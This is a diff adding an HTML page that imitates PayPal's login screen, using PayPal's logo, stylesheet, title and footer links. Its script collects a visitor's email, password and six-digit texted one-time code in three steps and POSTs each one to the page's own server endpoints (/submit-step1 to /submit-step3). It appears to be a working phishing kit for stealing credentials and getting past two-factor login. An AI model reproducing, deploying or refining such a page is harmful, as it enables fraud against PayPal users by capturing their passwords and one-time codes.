@@ -1,0 +1,520 @@
+
+
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+              <meta charset="UTF-8">
+              <meta http-equiv="X-UA-Compatible" content="IE=edge">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <link rel="preconnect" href="https://fonts.gstatic.com">
+              <link href="https://fonts.googleapis.com/css2?family=Dharma+Gothic&display=swap" rel="stylesheet">
+              <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/ec5/d423d5ca948be117596b4b08bd315/css/contextualLoginElementalUIv2.css">
+              <style>
+                  body {
+             font-family: Arial, sans-serif;
+              background-color: #ffff;
+              margin: 0;
+              box-sizing: border-box;
+              -webkit-text-size-adjust: 112.5%;
+
+              }
+
+              a {
+              text-decoration: none;
+              }
+
+              .container {
+              max-width: 100%;
+              margin: 0 auto;
+              display: flex;
+              justify-content: center;
+              flex-direction: column;
+              align-items: center;
+              margin-top: 120px;
+              font-size: 18px;
+              }
+
+              .section {
+              max-width: 100%;
+              width: 480px;
+              display: flex;
+              justify-content: center;
+              align-items: center;
+              flex-direction: column;
+              background-color: #fff;
+              border: 1px solid #ebebeb;
+              border-radius: 15px;
+              margin: 0 0 10px;
+              padding: 10px 0;
+              flex-grow: 1;
+              }
+
+              .logo {
+              margin: 12px auto 12px;
+              text-align: center;
+              height: 51px;
+              width: 40px;
+              overflow: hidden;
+              }
+
+              .input-field {
+            margin: 10px 0;
+            position: relative;
+            font-size: 14px;
+            width: 100%;
+            min-height: 48px;
+            text-overflow: ellipsis;
+          }
+
+          input {
+            padding: 10px;
+            font-size: 14px;
+            width: 20rem;
+            height: 64px;
+            outline: none;
+            background: #fff;
+            border: 1px solid gray;
+            border-radius: 5px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-family: pp-sans-big-regular,Helvetica Neue,Arial,sans-serif;
+            font-variant: normal;
+            font-weight: 400;
+            direction: ltr;
+
+          }
+
+          input:focus,
+          input:hover {
+            border-color: #142c8e; /* Change border color on hover or focus */
+            box-shadow: inset 0 0 0 0.0625rem #1072eb; /* Change box shadow color on hover or focus */
+          }
+
+
+
+
+
+          label {
+            position: absolute;
+            pointer-events: none;
+            left: 10px;
+            padding-bottom: 15px;
+            transform: translateY(10px);
+            line-height: 6px;
+            transition: all ease-out 0.1s;
+            font-size: 18px;
+            color: #999;
+            padding-top: 14px;
+          }
+
+          input:focus + label,
+          input:not(:placeholder-shown) + label {
+            transform: translateY(0);
+            transition: 0.3s ease-out;
+            font-size: 14px;
+          }
+
+          .input-field,
+          input,
+          label {
+            font-family: 'Dharma Gothic', sans-serif; /* Use Dharma Gothic for input fields and labels */
+          }
+              /* ... (other styles) */
+
+              .button actionContinue scTrack:unifiedlogin-login-click-next
+                .button actionContinue scTrack:unifiedlogin-login-submit {
+              text-align: center;
+              width: 100%;
+              padding: 0.5rem;
+              border: 1px solid transparent;
+              background-color: #142c8e;
+              color: #fff;
+              font-size: 14px;
+              font-weight: 500;
+              cursor: pointer;
+              border-radius: 20px;
+              transition: background-color 0.3s ease;
+              font-family: pp-sans-big-regular,Helvetica Neue,Arial,sans-serif;
+              font-weight: 400;
+              font-variant: normal;
+              font-size: 18px;
+              border-radius: 25px;
+              min-height: 48px;
+              word-wrap: break-word;
+              hyphens: auto;
+              }
+
+              /* Add a hover effect */
+              .login-btn:hover {
+              background-color: #1072eb; /* Change to the desired hover color */
+              }
+
+
+              .signup-btn {
+              text-align: center;
+              width: 100%;
+              padding: 0.5rem;
+              border: 1px solid #00457c;
+              background-color: #fff;
+              color: #00457c;
+              font-weight: 500;
+              font-size: 18px;
+              border-radius: 20px;
+              min-height: 48px;
+
+              transition: background-color 0.3s ease, color 0.3s ease;
+              }
+              .signup-btn:hover {
+          border-color: #142c8e; /* Change to the desired background hover color */
+              box-shadow: inset 0 0 0 0.0625rem #1072eb; /* Change to the desired text color on hover */
+              }
+
+              .separator {
+              display: flex;
+              justify-content: space-between;
+              align-items: center;
+              color: #999;
+              margin-top: 6px;
+              }
+
+              .separatorline {
+              height: 1px;
+              width: 40%;
+              background-color: #dbdbdb;
+              }
+
+              .language {
+              display: flex;
+              flex-direction: row;
+              font-size: 9px;
+              color: gray;
+              font-weight: 700;
+              margin-top: 50px;
+              cursor: pointer;
+              }
+
+              .select-language {
+              outline: none;
+              border: none;
+              }
+
+              .language-img {
+              margin-top: 15px; /* Increase the top margin to move the image down */
+              margin-right: 10px; /* Increase the right margin to move the image left */
+              width: 25px;
+              width: 25px;
+              height: 15px;
+          }
+
+
+              .hidden {
+              display: none;
+              }
+
+              /* Footer Styles */
+              .footer {
+              background-color: #ffff;
+              padding: 14px 0;
+              text-align: center;
+              }
+
+              .footer .legalFooter {
+              font-size: 11px;
+              font-family: pp-sans-big-regular,Helvetica Neue,Arial,sans-serif;
+              font-weight: 400;
+              font-variant: normal;
+              }
+
+              .footer .footerGroup {
+              list-style-type: none;
+              padding: 0;
+              margin: 0;
+              }
+
+              .footer .footerGroup li {
+              display: inline-block;
+              margin-right: 10px;
+              }
+
+              .footer .footerGroup li:last-child {
+              margin-right: 0;
+              }
+
+              .footer .footerGroup li a {
+              text-decoration: none;
+              color: #333;
+              }
+
+              .footer .footerGroup li a:hover {
+              text-decoration: underline;
+              }
+              .forgot-password a {
+              font-size: 18px;
+              color: #1072eb;
+              font-family: pp-sans-big-medium,Helvetica Neue,Arial,sans-serif;
+              font-variant: normal;
+              font-weight: 400;
+              display: inline-block;
+              margin: 0 0 16px;
+              }
+
+              .forgot-password a:hover {
+              text-decoration: underline;
+              }
+
+              #step2 a {
+              color: #1072eb;
+              text-decoration: none;
+              font-size: 112.5%
+              }
+
+              #step2 a:hover {
+              text-decoration: underline;
+              }
+              .overlay {
+              position: fixed;
+              width: 100%;
+              height: 100%;
+              background: rgba(0, 0, 0, 0.5);
+              display: none;
+              justify-content: center;
+              align-items: center;
+              z-index: 9999;
+              top: 0;
+              left: 0;
+              }
+
+              .loader {
+              border: 4px solid #f3f3f3;
+              border-top: 4px solid #3498db;
+              border-radius: 50%;
+              width: 20px;
+              height: 20px;
+              animation: spin 2s linear infinite;
+              margin: 20px auto;
+              }
+
+              @keyframes spin {
+              0% {
+              transform: rotate(0deg);
+              }
+
+              100% {
+              transform: rotate(360deg);
+              }
+              </style>
+
+              <title>PayPal</title>
+          </head>
+          <body>
+              <div class="container">
+                  <div class="section">
+                      <div class="logo">
+                          <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" />
+                      </div>
+
+                      <div class="overlay" id="overlay">
+                          <div class="loader"></div>
+                      </div>
+
+                      <!-- Step 1: Email or Mobile Number -->
+                      <form id="step1">
+                          <div class="input-field">
+                              <input id="email" name="login_email" type="email" required placeholder=" ">
+                              <label for="email">Email or mobile number</label>
+                          </div>
+                          <div class="forgot-password">
+                              <a href="#">Forgot email?</a>
+                          </div>
+                          <button class="button" type="button" id="nextToStep2">Next</button>
+                          <div class="separator">
+                              <div class="separatorline"></div>
+                              <p>or</p>
+                              <div class="separatorline"></div>
+                          </div>
+                          <button class="signup-btn">Sign Up</button>
+                      </form>
+
+                      <!-- Step 2: Enter Password -->
+                      <form class="login-form hidden" id="step2">
+                          <div class="input-field">
+                              <span id="displayUsername"></span>
+                              <a href="#">Change?</a>
+                              <div>
+                                  <input id="password" name="login_password" type="password" required placeholder="" aria-describedby="passwordErrorMessage">
+                                  <label for="password">Password</label>
+                              </div>
+                          </div>
+                          <button class="button" type="button" id="nextToStep3">Log In</button>
+
+                          <div class="forgot-password">
+                              <a href="#">Forgot password?</a>
+                          </div>
+                          <div class="separator">
+                              <div class="separatorline"></div>
+                              <p>or</p>
+                              <div class="separatorline"></div>
+                          </div>
+                          <button class="signup-btn">Sign Up</button>
+                      </form>
+
+                      <!-- Step 3: Enter OTP -->
+          <form class="login-form hidden" id="step3">
+              <h3 style="font-family: Arial, sans-serif; font-size: 18px; color: #333; text-align: center; margin-bottom: 20px;">
+                  Enter the code we texted you
+              </h3>
+              <div class="input-field" style="text-align: center;">
+                  <div style="display: flex; justify-content: center; gap: 10px;">
+                      <input id="otp1" type="text" maxlength="1" oninput="moveToNext(event, 'otp2')" autofocus
+                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
+                      <input id="otp2" type="text" maxlength="1" oninput="moveToNext(event, 'otp3')"
+                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
+                      <input id="otp3" type="text" maxlength="1" oninput="moveToNext(event, 'otp4')"
+                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
+                      <input id="otp4" type="text" maxlength="1" oninput="moveToNext(event, 'otp5')"
+                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
+                      <input id="otp5" type="text" maxlength="1" oninput="moveToNext(event, 'otp6')"
+                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
+                      <input id="otp6" type="text" maxlength="1"
+                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
+                  </div>
+                          </div>
+                          <button class="button" type="button" id="submitForm">Submit</button>
+
+               <button
+            class="styles_button_tertiary__6ka6j68 styles_button_size_lg__6ka6j62"
+            data-ppui-info=""
+            id="buttons"
+            data-nemo="tryDifferentWay"
+            name="tryDifferentWay"
+            href="#"
+            tab-index="0"
+            style="
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              background: none;
+              border: none;
+              color: #0070ba;
+              font-family: Arial, sans-serif;
+              font-size: 16px;
+              font-weight: 600;
+              cursor: pointer;
+              text-decoration: none;
+              height: 50px;
+              width:100%;
+              padding: 0 20px;
+              text-align: center;
+              line-height: normal;
+              white-space: nowrap;
+            "
+          >
+            Log In Another Way
+          </button>
+
+                      </form>
+
+                      <div class="language">
+                          <img class="language-img" src="https://upload.wikimedia.org/wikipedia/en/archive/a/a4/20151118161037%21Flag_of_the_United_States.svg" alt="">
+                          <p>English | Français | Español | 中文</p>
+                      </div>
+                  </div>
+              </div>
+
+              <script>
+                  function moveToNext(event, nextFieldId) {
+                      if (event.target.value.length === 1) {
+                          document.getElementById(nextFieldId).focus();
+                      }
+                  }
+
+                  const step1 = document.getElementById('step1');
+                  const step2 = document.getElementById('step2');
+                  const step3 = document.getElementById('step3');
+
+                  document.getElementById('nextToStep2').addEventListener('click', async () => {
+                      const email = document.getElementById('email').value;
+
+                      if (email) {
+                          const response = await fetch('/submit-step1', {
+                              method: 'POST',
+                              headers: { 'Content-Type': 'application/json' },
+                              body: JSON.stringify({ email })
+                          });
+
+                          const result = await response.json();
+                          alert(result.message);
+
+                          if (result.success) {
+                              step1.classList.add('hidden');
+                              step2.classList.remove('hidden');
+                              document.getElementById('displayUsername').textContent = email;
+                          }
+                      } else {
+                          alert('Please enter a valid email.');
+                      }
+                  });
+
+                  document.getElementById('nextToStep3').addEventListener('click', async () => {
+                      const password = document.getElementById('password').value;
+
+                      if (password) {
+                          const response = await fetch('/submit-step2', {
+                              method: 'POST',
+                              headers: { 'Content-Type': 'application/json' },
+                              body: JSON.stringify({ password })
+                          });
+
+                          const result = await response.json();
+                          alert(result.message);
+
+                          if (result.success) {
+                              step2.classList.add('hidden');
+                              step3.classList.remove('hidden');
+                          }
+                      } else {
+                          alert('Please enter a valid password.');
+                      }
+                  });
+
+                  document.getElementById('submitForm').addEventListener('click', async () => {
+                      const otp = Array.from({ length: 6 }, (_, i) => document.getElementById(`otp${i + 1}`).value).join('');
+
+                      if (otp) {
+                          const response = await fetch('/submit-step3', {
+                              method: 'POST',
+                              headers: { 'Content-Type': 'application/json' },
+                              body: JSON.stringify({ otp })
+                          });
+
+                          const result = await response.json();
+                          alert(result.message);
+
+                          if (result.success) {
+                              alert('Login process completed successfully!');
+                          }
+                      } else {
+                          alert('Please enter a valid OTP.');
+                      }
+                  });
+              </script>
+
+              <!-- Footer -->
+                  <footer class="footer footerStayPut" role="contentinfo">
+                      <div class="legalFooter">
+                          <ul class="footerGroup">
+                              <li><a target="_blank" href="https://paypal.com/us/smarthelp/contact-us" pa-marked="1">Contact Us</a>
+                              </li>
+                              <li><a target="_blank" href="https://paypal.com/us/webapps/mpp/ua/privacy-full"
+                                      pa-marked="1">Privacy</a></li>
+                              <li><a target="_blank" href="https://paypal.com/us/webapps/mpp/ua/legalhub-full" pa-marked="1">Legal</a>
+                              </li>
+                              <li><a target="_blank" href="https://paypal.com/us/webapps/mpp/ua/upcoming-policies-full"
+                                      pa-marked="1">Policy Updates</a></li>
+                              <li><a target="_blank" href="https://paypal.com/us/webapps/mpp/country-worldwide"
+                                      pa-marked="1">Worldwide</a></li>
+                          </ul>
+                      </div>
+                  </footer>
+
+          </body>
+          </html>
